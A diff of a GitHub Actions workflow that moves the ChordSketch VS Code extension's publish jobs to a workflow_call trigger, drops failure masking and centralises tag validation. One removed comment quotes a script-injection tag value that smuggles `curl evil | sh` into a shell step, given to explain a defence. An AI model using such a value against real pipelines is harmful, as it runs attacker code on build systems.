@@ -12,10 +12,17 @@ on:
       - "packages/vscode-extension/**"
       - "syntaxes/**"
       - ".github/workflows/vscode-extension.yml"
-  # GitHub Release publication triggers the publish job below.
-  # This event is path-filter-free, so the publish job always runs on release.
-  release:
-    types: [published]
+  # Reusable: called by release.yml's fan-out after the GitHub Release
+  # exists, so `build-platform` can download the per-platform
+  # chordsketch-lsp archives from it (ADR-0039). A non-empty `tag` is what
+  # puts this workflow in publish mode; on `push` / `pull_request` it is
+  # empty and only the `build` CI job runs.
+  workflow_call:
+    inputs:
+      tag:
+        description: "Tag to publish (e.g. v0.1.0). Format-validated by the caller."
+        required: true
+        type: string
   workflow_dispatch:
     inputs:
       tag:
@@ -28,7 +35,7 @@ on:
 # that rebase / force-push does not leave two parallel extension
 # builds contending for Linux runner capacity (every job here is
 # `ubuntu-latest`). `main` pushes, tag pushes, and `workflow_dispatch`
-# / `release` events are not grouped with PRs and run to completion.
+# / `workflow_call` runs are not grouped with PRs and run to completion.
 concurrency:
   group: vscode-extension-${{ github.event.pull_request.number || github.ref }}
   cancel-in-progress: ${{ github.event_name == 'pull_request' }}
@@ -177,20 +184,28 @@ jobs:
     # platform-specific VSIX. Needed for Tier 3 of the LSP resolver in
     # packages/vscode-extension/src/platform.ts to succeed post-install. See #1786.
     #
-    # continue-on-error lets the publish jobs run even when a subset of
-    # matrix cells fails (e.g., a transient `gh release download`
-    # failure on one platform). Cell failures are still visible in the
-    # workflow run's Jobs tab. Without this, a single failed cell marks
-    # the whole job failed and GitHub skips both publish jobs entirely,
-    # hiding the partial build behind a silent skip. The `Verify
-    # expected VSIX count` step inside each publish job is the real
-    # guardrail: it fails loudly when fewer than 8 VSIXes are present,
-    # so a partial build still blocks publish — just loudly instead of
-    # silently. See #1795.
-    continue-on-error: true
-    if: >-
-      github.event_name == 'release' ||
-      (github.event_name == 'workflow_dispatch' && inputs.tag != '')
+    # This job used to be `continue-on-error: true` so that one failed
+    # matrix cell would not skip the publish jobs (#1795) — the `Verify
+    # expected VSIX count` step inside each publish job was left as the
+    # only guardrail against shipping a partial set. The cost was that a
+    # wholly-failed matrix still reported the run green: on
+    # `desktop-v0.5.0` nine of this workflow's ten jobs failed (all seven
+    # cells here plus both publish jobs) and the run was still marked
+    # successful. That is exactly the "red is invisible" failure this
+    # rework exists to remove, so the masking is gone.
+    #
+    # Consequence, stated plainly: a failed cell now fails this job, which
+    # skips both publish jobs and turns the release run red. That is the
+    # same fail-closed shape `release.yml`'s `build` job already has, and
+    # it is loud rather than silent — which is what #1795 actually wanted.
+    # `fail-fast: false` stays so every cell still reports its own status.
+    # The count guardrail stays as defence in depth for the
+    # `workflow_dispatch` path, where the matrix can be re-run piecemeal.
+    #
+    # `inputs.tag` is the publish-mode discriminator; see the sister comment
+    # on napi.yml's `upload-release-tarballs` for why the event name cannot
+    # be used under `workflow_call`.
+    if: inputs.tag != ''
     strategy:
       fail-fast: false
       matrix:
@@ -277,36 +292,21 @@ jobs:
         run: npm run build
         working-directory: packages/vscode-extension
 
-      - name: Resolve release tag
-        id: tag
-        # Route the tag through `env:` rather than templating `${{ ... }}`
-        # directly into the shell script. Shell interpolation of untrusted
-        # input at YAML-template time is the classic Actions script-injection
-        # pattern (a tag like `v1.0.0"; curl evil | sh; #` would execute).
-        # `env:` + `"$VAR"` defers expansion to bash, which quotes correctly.
-        # The regex validation below is defense in depth: even a properly
-        # quoted bogus value shouldn't reach `gh release download`.
-        env:
-          EVENT_NAME: ${{ github.event_name }}
-          RELEASE_TAG: ${{ github.event.release.tag_name }}
-          INPUT_TAG: ${{ inputs.tag }}
-        run: |
-          set -euo pipefail
-          if [ "$EVENT_NAME" = "release" ]; then
-            TAG="$RELEASE_TAG"
-          else
-            TAG="$INPUT_TAG"
-          fi
-          if ! printf '%s' "$TAG" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.-]+)?$'; then
-            echo "Rejecting malformed tag: $TAG" >&2
-            exit 1
-          fi
-          echo "tag=$TAG" >> "$GITHUB_OUTPUT"
+      - name: Validate release tag
+        # Was an inline copy of the regex the composite action already
+        # holds; a second copy of a security-relevant pattern is a
+        # fix-propagation hazard, so this routes through the shared action
+        # like every other release workflow. Defense in depth for the
+        # `workflow_dispatch` path — the `workflow_call` path arrives
+        # pre-validated. See #1797.
+        uses: ./.github/actions/validate-release-tag
+        with:
+          tag: ${{ inputs.tag }}
 
       - name: Download and verify chordsketch-lsp from release
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          TAG: ${{ steps.tag.outputs.tag }}
+          TAG: ${{ inputs.tag }}
           RT: ${{ matrix.rust_target }}
           VS_TARGET: ${{ matrix.vs_target }}
           SERVER_SUBDIR: ${{ matrix.server_dir }}
@@ -400,16 +400,16 @@ jobs:
     #      https://github.com/koedame/chordsketch/settings/environments
     #      and add the PAT as the VSCE_PAT environment secret.
     #
-    # If the "vscode-marketplace" environment does not exist (fork, fresh instance),
-    # GitHub cannot start this job. continue-on-error keeps the overall workflow
-    # green when CI succeeded but publishing infrastructure is absent. See #1443.
-    continue-on-error: true
+    # If the "vscode-marketplace" environment does not exist (fork, fresh
+    # instance), GitHub cannot start this job. That used to be masked so
+    # the run stayed green (#1443); it is not any more. A release that
+    # cannot publish the extension is a failed release, and the
+    # pre-release checklist in docs/releasing.md already requires every
+    # publish environment to exist before the tag is cut.
     environment:
       name: vscode-marketplace
       url: https://marketplace.visualstudio.com/items?itemName=koedame.chordsketch
-    if: >-
-      github.event_name == 'release' ||
-      (github.event_name == 'workflow_dispatch' && inputs.tag != '')
+    if: inputs.tag != ''
     steps:
       - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
         # No `ref:` override — always check out main so scripts/ is present.
@@ -504,15 +504,12 @@ jobs:
     #      and add the token as the OPEN_VSX_TOKEN environment secret.
     #
     # If the "open-vsx" environment does not exist (fork, fresh instance),
-    # GitHub cannot start this job. continue-on-error keeps the overall workflow
-    # green when publishing infrastructure is absent. See #1604.
-    continue-on-error: true
+    # GitHub cannot start this job. See the sister comment on `publish`
+    # above for why the failure is no longer masked (#1604).
     environment:
       name: open-vsx
       url: https://open-vsx.org/extension/koedame/chordsketch
-    if: >-
-      github.event_name == 'release' ||
-      (github.event_name == 'workflow_dispatch' && inputs.tag != '')
+    if: inputs.tag != ''
     steps:
       - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
         # No `ref:` override — always check out main so scripts/ is present.
